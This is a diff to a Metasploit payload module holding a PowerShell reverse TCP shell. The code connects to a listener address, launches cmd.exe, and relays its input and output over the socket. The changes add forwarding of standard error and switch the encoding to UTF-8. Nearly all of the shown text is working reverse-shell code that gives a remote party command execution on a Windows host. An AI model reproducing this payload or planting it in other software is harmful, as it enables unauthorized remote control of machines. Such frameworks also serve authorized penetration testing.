@@ -10,7 +10,7 @@ require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
 
-  CachedSize = 1160
+  CachedSize = 1481
 
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
@@ -63,16 +63,20 @@ $b=#{lport};
 $c=New-Object system.net.sockets.tcpclient;
 $nb=New-Object System.Byte[] $c.ReceiveBufferSize;
 $ob=New-Object System.Byte[] 65536;
-$e=new-object System.Text.AsciiEncoding;
+$eb=New-Object System.Byte[] 65536;
+$e=new-object System.Text.UTF8Encoding;
 $p=New-Object System.Diagnostics.Process;
 $p.StartInfo.FileName='cmd.exe';
 $p.StartInfo.RedirectStandardInput=1;
 $p.StartInfo.RedirectStandardOutput=1;
+$p.StartInfo.RedirectStandardError=1;
 $p.StartInfo.UseShellExecute=0;
 $q=$p.Start();
 $is=$p.StandardInput;
 $os=$p.StandardOutput;
+$es=$p.StandardError;
 $osread=$os.BaseStream.ReadAsync($ob, 0, $ob.Length);
+$esread=$es.BaseStream.ReadAsync($eb, 0, $eb.Length);
 $c.connect($a,$b);
 $s=$c.GetStream();
 while ($true) {
@@ -81,6 +85,11 @@ while ($true) {
       $s.Write($ob,0,$osread.Result);
       $s.Flush();
       $osread = $os.BaseStream.ReadAsync($ob, 0, $ob.Length);
+    }
+    if ($esread.IsCompleted -and $esread.Result -ne 0) {
+      $s.Write($eb,0,$esread.Result);
+      $s.Flush();
+      $esread = $es.BaseStream.ReadAsync($eb, 0, $eb.Length);
     }
     if ($s.DataAvailable) {
       $r=$s.Read($nb,0,$nb.Length);
